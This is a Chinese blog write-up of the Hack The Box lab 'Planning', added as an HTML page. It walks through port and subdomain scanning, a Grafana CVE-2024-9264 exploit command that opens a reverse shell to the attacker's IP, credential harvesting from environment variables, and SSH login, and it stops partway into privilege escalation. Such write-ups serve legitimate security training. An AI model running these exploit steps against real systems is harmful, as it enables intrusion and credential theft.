@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HTB Planning - Zsm Blog</title><meta name="Description" content="Zsm Blog,crypto,ctf,nodejs,wp,密码学"><meta property="og:url" content="https://www.zhuangsanmeng.xyz/htb-planning/">
+  <meta property="og:site_name" content="Zsm Blog">
+  <meta property="og:title" content="HTB Planning">
+  <meta property="og:description" content="前言 好久没打靶机了，昨天睿抗校赛摸鱼打了一半，回宿舍打完了
+外网打点 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ❯ nmap -sC -sV 10.10.11.68 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 14:57 CST Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining) Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining) Nmap scan report for 10.10.11.68 Host is up (0.26s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA) |_ 256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-title: Did not follow redirect to http://planning.htb/ |_http-server-header: nginx/1.24.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.18 seconds 把域名加到/etc/hosts里面，访问一下，发现没有明显的目标，扫目录">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-25T11:02:45+08:00">
+    <meta property="article:modified_time" content="2025-05-25T11:02:45+08:00">
+    <meta property="article:tag" content="渗透">
+    <meta property="og:image" content="https://www.zhuangsanmeng.xyz/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://www.zhuangsanmeng.xyz/">
+  <meta name="twitter:title" content="HTB Planning">
+  <meta name="twitter:description" content="前言 好久没打靶机了，昨天睿抗校赛摸鱼打了一半，回宿舍打完了
+外网打点 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ❯ nmap -sC -sV 10.10.11.68 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 14:57 CST Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining) Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining) Nmap scan report for 10.10.11.68 Host is up (0.26s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA) |_ 256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-title: Did not follow redirect to http://planning.htb/ |_http-server-header: nginx/1.24.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.18 seconds 把域名加到/etc/hosts里面，访问一下，发现没有明显的目标，扫目录">
+<meta name="application-name" content="Zsm blog">
+<meta name="apple-mobile-web-app-title" content="Zsm blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.zhuangsanmeng.xyz/htb-planning/" /><link rel="prev" href="https://www.zhuangsanmeng.xyz/huangheliuyu/" /><link rel="next" href="https://www.zhuangsanmeng.xyz/thm-the-london-bridge/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HTB Planning",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.zhuangsanmeng.xyz\/htb-planning\/"
+        },"genre": "posts","keywords": "渗透","wordcount":  1423 ,
+        "url": "https:\/\/www.zhuangsanmeng.xyz\/htb-planning\/","datePublished": "2025-05-25T11:02:45+08:00","dateModified": "2025-05-25T11:02:45+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Zsm"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/" title="About"> 关于 </a><a class="menu-item" href="/friend/" title="Friend"> 友链 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Zsm Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="About">关于</a><a class="menu-item" href="/friend/" title="Friend">友链</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+    <h2 class="toc-title">Contents</h2>
+    <div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HTB Planning</h1><div class="post-meta">
+        <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Zsm</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"
+                    aria-hidden="true"></i>靶场</a></span></div>
+        <div class="post-meta-line">
+    
+
+    
+        
+
+        
+        
+            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
+                
+                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
+        
+    
+
+<i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-05-25">2025-05-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1423 words&nbsp;
+            <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;<span id="/htb-planning/" class="leancloud_visitors" data-flag-title="HTB Planning">
+                <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span
+                    class=leancloud-visitors-count></span>&nbsp;views
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="">
+        <div class="details-summary toc-title">
+            <span>Contents</span>
+            <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#外网打点">外网打点</a></li>
+    <li><a href="#提权">提权</a></li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+    </div><div class="content" id="content"><h2 id="前言">前言</h2>
+<p>好久没打靶机了，昨天睿抗校赛摸鱼打了一半，回宿舍打完了</p>
+<h2 id="外网打点">外网打点</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ nmap -sC -sV 10.10.11.68 
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 14:57 CST
+</span></span><span class="line"><span class="cl">Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining)
+</span></span><span class="line"><span class="cl">Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+</span></span><span class="line"><span class="cl">Connect Scan Timing: About 99.99% done; ETC: 14:58 (0:00:00 remaining)
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.68
+</span></span><span class="line"><span class="cl">Host is up (0.26s latency).
+</span></span><span class="line"><span class="cl">Not shown: 998 closed tcp ports (conn-refused)
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey:
+</span></span><span class="line"><span class="cl">|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.24.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://planning.htb/
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.24.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 48.18 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>把域名加到<code>/etc/hosts</code>里面，访问一下，发现没有明显的目标，扫目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ python dirsearch.py -u http://planning.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12290
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://planning.htb/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[15:03:45] Scanning:
+</span></span><span class="line"><span class="cl">[15:04:03] 200 -   12KB - /about.php
+</span></span><span class="line"><span class="cl">[15:04:30] 200 -   10KB - /contact.php
+</span></span><span class="line"><span class="cl">[15:04:31] 301 -   178B - /css  -&gt;  http://planning.htb/css/
+</span></span><span class="line"><span class="cl">[15:04:43] 301 -   178B - /img  -&gt;  http://planning.htb/img/
+</span></span><span class="line"><span class="cl">[15:04:44] 200 -   23KB - /index.php
+</span></span><span class="line"><span class="cl">[15:04:48] 403 -   564B - /js/
+</span></span><span class="line"><span class="cl">[15:04:48] 301 -   178B - /js  -&gt;  http://planning.htb/js/
+</span></span><span class="line"><span class="cl">[15:04:49] 301 -   178B - /lib  -&gt;  http://planning.htb/lib/
+</span></span><span class="line"><span class="cl">[15:04:49] 403 -   564B - /lib/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Task Completed
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>依旧没有有用的信息，后面上了个字典也没扫出来东西，爆一下子域名试试</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ ./ffuf -w /home/zsm/fuzzDicts-Pro/subdomainDicts/main.txt  -u &#39;http://10.10.11.68&#39; -H &#34;Host:FUZZ.planning.htb&#34; -fs 178  
+</span></span><span class="line"><span class="cl">        /&#39;___\  /&#39;___\           /&#39;___\
+</span></span><span class="line"><span class="cl">       /\ \__/ /\ \__/  __  __  /\ \__/
+</span></span><span class="line"><span class="cl">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+</span></span><span class="line"><span class="cl">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+</span></span><span class="line"><span class="cl">         \ \_\   \ \_\  \ \____/  \ \_\
+</span></span><span class="line"><span class="cl">          \/_/    \/_/   \/___/    \/_/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://10.10.11.68
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /home/zsm/fuzzDicts-Pro/subdomainDicts/main.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.planning.htb
+</span></span><span class="line"><span class="cl"> :: Follow redirects : false
+</span></span><span class="line"><span class="cl"> :: Calibration      : false
+</span></span><span class="line"><span class="cl"> :: Timeout          : 10
+</span></span><span class="line"><span class="cl"> :: Threads          : 40
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl"> :: Filter           : Response size: 178
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 268ms]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>扫出来一个，加到本地，访问，是个<code>grafana</code>的login页面，htb给了账号密码admin / 0D5oT70Fq13EvB5r，进去，同时看见版本是v11，网上找一下有没有cve，<a href="https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit" target="_blank" rel="noopener noreffer ">CVE-2024-9264</a>，dump下来直接打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">python3</span> <span class="n">poc</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">grafana</span><span class="o">.</span><span class="n">planning</span><span class="o">.</span><span class="n">htb</span> <span class="o">--</span><span class="n">username</span> <span class="n">admin</span> <span class="o">--</span><span class="n">password</span> <span class="mi">0</span><span class="n">D5oT70Fq13EvB5r</span> <span class="o">--</span><span class="n">reverse</span><span class="o">-</span><span class="n">ip</span> <span class="err">你的</span><span class="n">ip</span>  <span class="o">--</span><span class="n">reverse</span><span class="o">-</span><span class="n">port</span> <span class="err">你的</span><span class="n">port</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">Login</span> <span class="n">successful</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="n">Reverse</span> <span class="n">shell</span> <span class="n">payload</span> <span class="n">sent</span> <span class="n">successfully</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="n">Set</span> <span class="n">up</span> <span class="n">a</span> <span class="n">netcat</span> <span class="n">listener</span> <span class="n">on</span> <span class="n">port</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里本地是mac，一定要加上sudo才可以跑，成功拿到shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Connection</span> <span class="n">from</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.68</span><span class="p">:</span><span class="mi">33462</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t access tty; job control turned off</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">LICENSE</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">conf</span>
+</span></span><span class="line"><span class="cl"><span class="n">public</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># env</span>
+</span></span><span class="line"><span class="cl"><span class="n">GF_PATHS_HOME</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">grafana</span>
+</span></span><span class="line"><span class="cl"><span class="n">HOSTNAME</span><span class="o">=</span><span class="mi">7</span><span class="n">ce659d667d7</span>
+</span></span><span class="line"><span class="cl"><span class="n">AWS_AUTH_EXTERNAL_ID</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="n">SHLVL</span><span class="o">=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">HOME</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">grafana</span>
+</span></span><span class="line"><span class="cl"><span class="n">AWS_AUTH_AssumeRoleEnabled</span><span class="o">=</span><span class="bp">true</span>
+</span></span><span class="line"><span class="cl"><span class="n">GF_PATHS_LOGS</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">grafana</span>
+</span></span><span class="line"><span class="cl"><span class="n">_</span><span class="o">=</span><span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">GF_PATHS_PROVISIONING</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">grafana</span><span class="o">/</span><span class="n">provisioning</span>
+</span></span><span class="line"><span class="cl"><span class="n">GF_PATHS_PLUGINS</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">grafana</span><span class="o">/</span><span class="n">plugins</span>
+</span></span><span class="line"><span class="cl"><span class="n">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">grafana</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">AWS_AUTH_AllowedAuthProviders</span><span class="o">=</span><span class="n">default</span><span class="p">,</span><span class="n">keys</span><span class="p">,</span><span class="n">credentials</span>
+</span></span><span class="line"><span class="cl"><span class="n">GF_SECURITY_ADMIN_PASSWORD</span><span class="o">=</span><span class="n">RioTecRANDEntANT</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="n">AWS_AUTH_SESSION_DURATION</span><span class="o">=</span><span class="mi">15</span><span class="n">m</span>
+</span></span><span class="line"><span class="cl"><span class="n">GF_SECURITY_ADMIN_USER</span><span class="o">=</span><span class="n">enzo</span>
+</span></span><span class="line"><span class="cl"><span class="n">GF_PATHS_DATA</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">grafana</span>
+</span></span><span class="line"><span class="cl"><span class="n">GF_PATHS_CONFIG</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">grafana</span><span class="o">/</span><span class="n">grafana</span><span class="o">.</span><span class="n">ini</span>
+</span></span><span class="line"><span class="cl"><span class="n">AWS_CW_LIST_METRICS_PAGE_LIMIT</span><span class="o">=</span><span class="mi">500</span>
+</span></span><span class="line"><span class="cl"><span class="n">PWD</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">grafana</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>docker逃逸？哦，有ssh，密码账号(enzo/RioTecRANDEntANT!)直接登录，拿到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">enzo@planning:~$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="提权">提权</h2>
+<p>先传linpeas上去，没什么明显的漏洞，翻一下经常有问题的目录，成功找到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">enzo</span><span class="err">@</span><span class="n">planning</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">crontabs</span><span class="o">$</span> <span class="n">cat</span> <span class="n">crontab</span><span class="o">.</span><span class="n">db</span>
